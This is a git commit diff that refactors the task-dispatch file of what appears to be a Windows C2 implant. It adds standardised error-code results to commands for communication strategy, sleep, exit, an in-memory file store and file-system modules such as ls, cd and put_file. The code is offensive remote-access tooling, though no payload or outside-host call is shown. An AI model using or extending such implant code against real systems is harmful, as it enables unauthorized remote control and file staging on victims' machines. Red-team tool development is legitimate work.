065e564e5ecbf7a92ab9ee3567b8e62c72475e1d
Ryan Kleffman <ryankleffman47@gmail.com>
2026-02-16 00:53:19 +0000

    Update docs and command tree to be accurate.

--- server/src/server/modules/implant_builder/implant_base/control/commandtree.cpp
+++ server/src/server/modules/implant_builder/implant_base/control/commandtree.cpp
@@ -66,27 +66,19 @@ std::string GetErrorMessage(DWORD dwErrorCode) {
 //take in the mapped object, after converted from msgpack
 //all command splitting/overhead logic is done here, then passed to the appropriate modules
 nlohmann::json command_tree(nlohmann::json task_data) {
-
     //Note, if ever a vector of tasks, do a for loop over said vector here - or have caller call command_tree multiple times. both are fair options. 
-
-    //if (!task_data) {
-    //    std::cout << "Error occured, nothign in task data" << std::endl;
-    //    return 1;
-    //}
-
-    //dump task
-    //std::cout << task_data.dump() << std::endl;
-
     std::string task_name = task_data["task"]["task_name"];
-
     //basic checks for the task. 
     if (task_name.empty()) {
         nlohmann::json result;
-        add_text_result(result, "error", "No task provided");
+        add_int_result(result, "windows_error_code", ERROR_INVALID_PARAMETER);
+        add_text_result(result, "message", GetErrorMessage(ERROR_INVALID_PARAMETER));
+        add_text_result(result, "data", "");
         return result;
     }
-
-    //do the tasks - no switch cuz c++ doesn;t support std;:string case switch
+    /*
+    Strat commands
+    */
     if (task_name == "strat get") {
         nlohmann::json result;
 
@@ -95,8 +87,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         
         SettingsManager::instance().set("comms_get_function", comms_get_function);
 
-        add_text_result(result, "message", "Comms Get Function set to: " + comms_get_function);
         add_text_result(result, "data", comms_get_function);
+        //hardcode success, as this is not a module
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
 
         return result;
     }
@@ -108,8 +102,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         
         SettingsManager::instance().set("comms_post_function", comms_post_function);
 
-        add_text_result(result, "message", "Comms Post Function set to: " + comms_post_function);
         add_text_result(result, "data", comms_post_function);
+        //hardcode success, as this is not a module
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
 
         return result;
     }
@@ -132,8 +128,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
             output += name + "\n";
         }
 
-        add_text_result(result, "message", "Available Strategies:");
         add_text_result(result, "data", output);
+        //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
 
         return result;
     }
@@ -143,11 +141,24 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::string get_strategy = SettingsManager::instance().get<std::string>("comms_get_function", "");
         std::string post_strategy = SettingsManager::instance().get<std::string>("comms_post_function", "");
 
+        //hardcode data response, these do not have the saem req's as modules, as they aren't modules. 
+        //note - this may move to a settings option later. 
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        add_text_result(result, "data", "");
 
         add_text_result(result, "comms_get_strategy", get_strategy);
         add_text_result(result, "comms_post_strategy", post_strategy);
 
         return result;
+    }
+    /*
+    System/Systems commands
+    */
+    else if (task_name == "exit") {
+        //no return, just kill it
+        //maybe move me to a module later for different shutdown options
+        exit(0);
     }
     else if (task_name == "sleep") {
         nlohmann::json result;
@@ -157,11 +168,123 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         
         SettingsManager::instance().set("sleep_time", sleep_time);
 
-        add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
+        //add_text_result(result, "message", "Sleep set to: " + std::to_string(sleep_time));
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
         add_text_result(result, "data", std::to_string(sleep_time));
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
 
         return result;
     }
+
+    else if (task_name == "memstore upload") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
+            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
+            return result;
+        }
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_name' is missing or not a string.");
+            return result;
+        }
+
+        std::string file_name = task_data["task"]["args"]["file_name"];
+
+        //get element
+        auto& json_element = task_data["task"]["args"]["file_contents"];
+        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
+        std::vector<uint8_t> file_bytes;
+        file_bytes = json_element.get_binary();
+
+        int windows_error_code = MemStore::instance().store(file_name, file_bytes);
+
+        //store does not have a return type/good way to check success yet, for now, assuming it was successful
+        //could do a "num of items before, then add, and if items = items +1"
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        //hardcode data response, memstore does not have same returns as modules,  as it's not a module
+        add_text_result(result, "data", "");
+        return result;
+
+
+    }
+    else if (task_name == "memstore download") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
+            return result;
+        }
+
+        std::string memstore_file_to_download = task_data["task"]["args"]["file_name"];
+
+        std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);
+
+        add_bytes_result(result, "data", memstore_file_bytes);
+        //hardcode response, memstore does not have same return values as modules, as it's not a module
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+        return result;
+    }
+    else if (task_name == "memstore delete") {
+        nlohmann::json result;
+
+        //check for correct values
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
+            return result;
+        }
+
+        std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];
+
+        int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        //hardcode data field, memstore does not have same requirements as modules,  as it's not a module
+        add_text_result(result, "data", "");
+        return result;
+
+
+    }
+    else if (task_name == "memstore clear") {
+        nlohmann::json result;
+
+        //currently always returns success
+        int windows_error_code = MemStore::instance().clear();
+
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        //hardcode data response, memstore does not have same response req's as modules,  as it's not a module
+        add_text_result(result, "data", "");
+        return result;
+
+    }
+    else if (task_name == "memstore list") {
+        nlohmann::json result;
+
+        std::vector<std::string> file_names = MemStore::instance().get_file_names();
+
+        std::string output;
+        for (std::string file_name : file_names) {
+            output += file_name;
+            output += "\n";
+        }
+
+        //std::cout << output << std::endl;
+
+        add_text_result(result, "data", output);
+        //hardcode response, memstore does not have same return values as modules,  as it's not a module
+        add_int_result(result, "windows_error_code", ERROR_SUCCESS);
+        add_text_result(result, "message", GetErrorMessage(ERROR_SUCCESS));
+
+        return result;
+    }
+    /*
+    Modules
+    */
     else if (task_name == "ls") {
         nlohmann::json result;
         //get args, which are named compontents in the task->args block of the task_data
@@ -196,9 +319,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
 
         ModuleResult module_result = cd(directory_to_traverse_to);
-        std::string message = module_result.data;
+        std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
+        add_text_result(result, "data", data);
         add_text_result(result, "message", GetErrorMessage(windows_error_code));
         add_int_result(result, "windows_error_code", windows_error_code);
 
@@ -264,116 +388,22 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         //auto [content, windows_error_code] = put_file(file_bytes, file_path);
         //not using auto, for readability/knowing what type things are
         ModuleResult module_result = put_file(file_bytes, file_path);
-        std::string message = module_result.data;
+        std::string data = module_result.data;
         DWORD windows_error_code = module_result.windows_error_code;
 
         add_text_result(result, "message", GetErrorMessage(windows_error_code));
         add_int_result(result, "windows_error_code", windows_error_code);
-
-        return result;
-    }
-    else if (task_name == "memstore upload") {
-        nlohmann::json result;
-
-        auto& args = task_data["task"]["args"];
-        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
-            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
-            return result;
-        }
-        if (!args.contains("file_name") || !args["file_name"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_name' is missing or not a string.");
-            return result;
-        }
-
-        std::string file_name = task_data["task"]["args"]["file_name"];
-
-        //get element
-        auto& json_element = task_data["task"]["args"]["file_contents"];
-        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
-        std::vector<uint8_t> file_bytes;
-        file_bytes = json_element.get_binary();
-
-        int windows_error_code = MemStore::instance().store(file_name, file_bytes);
-
-        //store does not have a return type/good way to check success yet, for now, assuming it was successful
-        //could do a "num of items before, then add, and if items = items +1"
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        return result;
-
-
-    }
-    else if (task_name == "memstore download") {
-        nlohmann::json result;
-
-        auto& args = task_data["task"]["args"];
-        if (!args.contains("file_name") || !args["file_name"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
-            return result;
-        }
-
-        std::string memstore_file_to_download = task_data["task"]["args"]["file_name"];
-
-        std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);
-
-        add_bytes_result(result, "file_contents", memstore_file_bytes);
-        return result;
-    }
-    else if (task_name == "memstore delete") {
-        nlohmann::json result;
-
-        //check for correct values
-        auto& args = task_data["task"]["args"];
-        if (!args.contains("file_name") || !args["file_name"].is_string()) {
-            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
-            return result;
-        }
-
-        std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];
-
-        int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        return result;
-
-
-    }
-    else if (task_name == "memstore clear") {
-        nlohmann::json result;
-
-        //currently always returns success
-        int windows_error_code = MemStore::instance().clear();
-
-        add_text_result(result, "message", GetErrorMessage(windows_error_code));
-        add_int_result(result, "windows_error_code", windows_error_code);
-        return result;
-
-    }
-    else if (task_name == "memstore list") {
-        nlohmann::json result;
-
-        std::vector<std::string> file_names = MemStore::instance().get_file_names();
-
-        std::string output;
-        for (std::string file_name: file_names) {
-            output += file_name;
-            output += "\n";
-        }
-
-        //std::cout << output << std::endl;
-
-        add_text_result(result, "data", output);
+        add_text_result(result, "data", data);
 
         return result;
     }
 
-    else if (task_name == "exit") {
-        //no return, just kill it
-        exit(0);
-    }
     else {
         nlohmann::json result;
-        add_text_result(result, "error", "command not found");
+        add_int_result(result, "windows_error_code", ERROR_INVALID_PARAMETER);
+        add_text_result(result, "message", GetErrorMessage(ERROR_INVALID_PARAMETER));
+        add_text_result(result, "data", "");
+
         return result;
     }
 
